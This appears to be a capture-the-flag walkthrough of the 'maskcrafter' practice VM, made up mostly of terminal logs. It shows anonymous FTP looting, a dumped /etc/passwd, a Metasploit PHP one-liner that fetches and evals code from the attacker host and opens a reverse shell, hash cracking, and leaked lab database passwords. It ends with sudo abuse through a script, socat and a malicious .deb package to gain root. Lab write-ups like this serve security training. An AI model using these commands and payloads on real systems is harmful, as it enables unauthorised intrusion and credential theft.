@@ -1,0 +1,319 @@
+Connect to FTP:
+hack@kali:~/CTF/maskcrafter$ ftp 192.168.1.9
+Connected to 192.168.1.9.
+220 Welcome to maskcrafter(TM) FTP service.
+Name (192.168.1.9:hack): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 112      115          4096 Mar 24 03:19 pub
+226 Directory send OK.
+ftp> cd pub
+250 Directory successfully changed.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             202 Mar 22 06:26 NOTES.txt
+-rw-r--r--    1 0        0             229 Mar 23 12:31 cred.zip
+-rw-r--r--    1 0        115          5497 Mar 24 03:19 rce.php
+226 Directory send OK.
+ftp> get NOTES.txt
+local: NOTES.txt remote: NOTES.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for NOTES.txt (202 bytes).
+226 Transfer complete.
+202 bytes received in 0.01 secs (18.5122 kB/s)
+ftp> get cred.zip
+local: cred.zip remote: cred.zip
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for cred.zip (229 bytes).
+226 Transfer complete.
+229 bytes received in 0.29 secs (0.7637 kB/s)
+ftp> get rce.php                                                                                    
+local: rce.php remote: rce.php                                                                      
+200 PORT command successful. Consider using PASV.                                                   
+150 Opening BINARY mode data connection for rce.php (5497 bytes).                                   
+226 Transfer complete.                                                                              
+5497 bytes received in 0.05 secs (105.0624 kB/s)                                                    
+ftp>                                                                                                
+ftp>                                                                                                
+ftp> bye                                                                                            
+221 Goodbye.   
+
+
+
+
+Using Burp and repeater:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+userx:x:1000:1000:userx:/home/userx:/bin/bash
+mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
+researcherx:x:1001:1001:,,,:/home/researcherx:/bin/bash
+ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+statd:x:113:65534::/var/lib/nfs:/usr/sbin/nologin
+evdaez:x:1002:1002:,,,:/home/evdaez:/bin/bash
+
+
+With msfconsole reverse shell + Repeater:
+
+msf5 exploit(multi/script/web_delivery) > run
+[*] Exploit running as background job 2.
+[*] Exploit completed, but no session was created.
+msf5 exploit(multi/script/web_delivery) > 
+[*] Started reverse TCP handler on 192.168.1.15:4444 
+[*] Using URL: http://0.0.0.0:9090/YSfcFpKL
+[*] Local IP: http://192.168.1.15:9090/YSfcFpKL
+[*] Server started.
+[*] Run the following command on the target machine:
+php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.1.15:9090/YSfcFpKL', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
+[*] 192.168.1.9      web_delivery - Delivering Payload (1113 bytes)
+[*] Sending stage (38288 bytes) to 192.168.1.9
+[*] Meterpreter session 1 opened (192.168.1.15:4444 -> 192.168.1.9:35838) at 2020-05-24 13:25:39 +0200
+
+msf5 exploit(multi/script/web_delivery) > 
+msf5 exploit(multi/script/web_delivery) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                  Connection
+  --  ----  ----                   -----------                  ----------
+  1         meterpreter php/linux  www-data (33) @ maskcrafter  192.168.1.15:4444 -> 192.168.1.9:35838 (192.168.1.9)
+
+msf5 exploit(multi/script/web_delivery) > sessions 1
+[*] Starting interaction with 1...
+
+meterpreter > 
+meterpreter > 
+meterpreter > ls
+Listing: /var/www/html/debug
+============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100644/rw-r--r--  740   fil   2020-03-24 00:52:36 +0100  index.php
+
+meterpreter > getuid
+Server username: www-data (33)
+
+
+/etc/apache2/.htpasswd
+admin:$apr1$i8wbKU0V$rr1KgCaucnwPju.8ngqT40
+
+hack@kali:~/CTF/maskcrafter$ sudo john hash
+[sudo] password di hack: 
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Will run 3 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+admin            (?)
+1g 0:00:00:00 DONE 2/3 (2020-05-24 15:06) 4.166g/s 12000p/s 12000c/s 12000C/s windsurf..buzz
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+hack@kali:~/CTF/maskcrafter$ sudo john --show
+Password files required, but none specified
+hack@kali:~/CTF/maskcrafter$ sudo john hash --show
+?:admin
+
+1 password hash cracked, 0 left
+
+Info form db.php
+$connection = mysqli_connect("localhost", "web", "P@ssw0rdweb", "mydatabase");
+
+
+mysql> use mydatabase;
+use mydatabase;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> 
+
+mysql> show tables;
+show tables;
++----------------------+
+| Tables_in_mydatabase |
++----------------------+
+| creds                |
+| login                |
++----------------------+
+2 rows in set (0.00 sec)
+
+mysql> select * from creds;
+select * from creds;
++----+--------------+-------------+
+| id | data_type    | password    |
++----+--------------+-------------+
+|  1 | zip password | cred12345!! |
++----+--------------+-------------+
+1 row in set (0.03 sec)
+
+mysql> select * from login;
+select * from login;
++----+----------+-------------+-------------------------+
+| id | username | password    | email                   |
++----+----------+-------------+-------------------------+
+|  1 | admin    | P@ssw0rd666 | admin@covid19.localhost |
+|  2 | user     | P@ssw0rd777 | user@covid19.localhost  |
++----+----------+-------------+-------------------------+
+2 rows in set (0.00 sec)
+
+mysql> 
+
+
+Use pass to unzip cred.zip:
+hack@kali:~/CTF/maskcrafter$ cat cred.txt 
+userx:thisismypasswordforuserx2020
+
+
+Find way to Priv Esc:
+userx@maskcrafter:~$ sudo -l
+Matching Defaults entries for userx on maskcrafter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User userx may run the following commands on maskcrafter:
+    (evdaez) NOPASSWD: /scripts/whatsmyid.sh
+userx@maskcrafter:~$ 
+userx@maskcrafter:~$ 
+userx@maskcrafter:~$ cd /scripts/
+userx@maskcrafter:/scripts$ ls -la
+total 12
+drwxr-xr-x  2 root  root  4096 Mar 24 03:25 .
+drwxr-xr-x 28 root  root  4096 May 24 10:38 ..
+-rwxr-xr-x  1 userx userx   44 Mar 24 03:25 whatsmyid.sh
+userx@maskcrafter:/scripts$ 
+userx@maskcrafter:/scripts$ echo "/bin/bash" >> whatsmyid.sh 
+userx@maskcrafter:/scripts$ cat whatsmyid.sh 
+#!/bin/bash
+find /var/log -mtime +3 -delete
+/bin/bash
+userx@maskcrafter:/scripts$ sudo -u evdaez ./whatsmyid.sh 
+......................
+......................
+evdaez@maskcrafter:/scripts$ id
+uid=1002(evdaez) gid=1002(evdaez) groups=1002(evdaez)
+evdaez@maskcrafter:/scripts$ 
+
+
+evdaez@maskcrafter:/home/evdaez$ sudo -l
+Matching Defaults entries for evdaez on maskcrafter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User evdaez may run the following commands on maskcrafter:
+    (researcherx) NOPASSWD: /usr/bin/socat
+evdaez@maskcrafter:/home/evdaez$ 
+evdaez@maskcrafter:/home/evdaez$ sudo -u researcherx socat stdin exec:/bin/sh
+
+
+id
+uid=1001(researcherx) gid=1001(researcherx) groups=1001(researcherx),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
+
+
+Prepare .deb and transfer to victim:
+hack@kali:~/CTF/maskcrafter$ TF=$(mktemp -d)
+hack@kali:~/CTF/maskcrafter$ echo 'exec /bin/sh' > $TF/x.sh
+hack@kali:~/CTF/maskcrafter$ fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
+Doing `require 'backports'` is deprecated and will not load any backport in the next major release.
+Require just the needed backports instead, or 'backports/latest'.
+Debian packaging tools generally labels all files in /etc as config files, as mandated by policy, so fpm defaults to this behavior for deb packages. You can disable this default behavior with --deb-no-default-config-files flag {:level=>:warn}                                                                  
+Created package {:path=>"x_1.0_all.deb"}
+hack@kali:~/CTF/maskcrafter$ 
+
+Start python server and export .deb:
+researcherx@maskcrafter:/home/researcherx$ wget 192.168.1.15:8888/x_1.0_all.deb
+wget 192.168.1.15:8888/x_1.0_all.deb
+--2020-05-24 13:32:14--  http://192.168.1.15:8888/x_1.0_all.deb
+Connecting to 192.168.1.15:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1104 (1.1K) [application/x-debian-package]
+Saving to: ‘x_1.0_all.deb’
+
+x_1.0_all.deb       100%[===================>]   1.08K  --.-KB/s    in 0s      
+
+2020-05-24 13:32:14 (101 MB/s) - ‘x_1.0_all.deb’ saved [1104/1104]
+
+researcherx@maskcrafter:/home/researcherx$ 
+
+researcherx@maskcrafter:/home/researcherx$ ls
+ls
+x_1.0_all.deb
+researcherx@maskcrafter:/home/researcherx$ sudo dpkg -i x_1.0_all.deb
+sudo dpkg -i x_1.0_all.deb
+(Reading database ... 131672 files and directories currently installed.)
+Preparing to unpack x_1.0_all.deb ...
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+cd /root
+# ls -la
+ls -la
+total 88
+drwx------  9 root root  4096 Mar 24 03:12 .
+drwxr-xr-x 28 root root  4096 May 24 10:38 ..
+-rw-r--r--  1 root root    39 Mar 20 00:43 .bash_aliases
+lrwxrwxrwx  1 root root     9 Mar 20 23:33 .bash_history -> /dev/null
+-rw-r--r--  1 root root  3105 Mar 20 00:43 .bashrc
+drwx------  2 root root  4096 Mar 21 01:43 .cache
+-rw-r--r--  1 root root    22 Mar 20 02:47 .gdbinit
+drwxr-xr-x  3 root root  4096 Mar 20 07:21 .gem
+drwx------  3 root root  4096 Mar 21 01:43 .gnupg
+-rw-------  1 root root    38 Mar 20 06:43 .lesshst
+drwxr-xr-x  3 root root  4096 Mar 20 06:52 .local
+drwxr-xr-x  4 root root  4096 Mar 20 02:47 peda
+-rw-r--r--  1 root root   148 Aug 17  2015 .profile
+-rw-r--r--  1 root root    75 Mar 23 12:37 root.txt
+-rw-r--r--  1 root root    75 Mar 20 06:40 .selected_editor
+drwx------  2 root root  4096 Mar 20 00:59 .ssh
+drwxr-xr-x  2 root root  4096 Mar 21 00:43 .vim
+-rw-------  1 root root 20347 Mar 24 03:12 .viminfo
+-rw-r--r--  1 root root   215 Mar 21 01:11 .wget-hsts
+# cat root.txt
+cat root.txt
+Congrats on finishing this VM...
+
+Please tweet me your walkthrough @evdaez
+# 
+
+
+
+
+
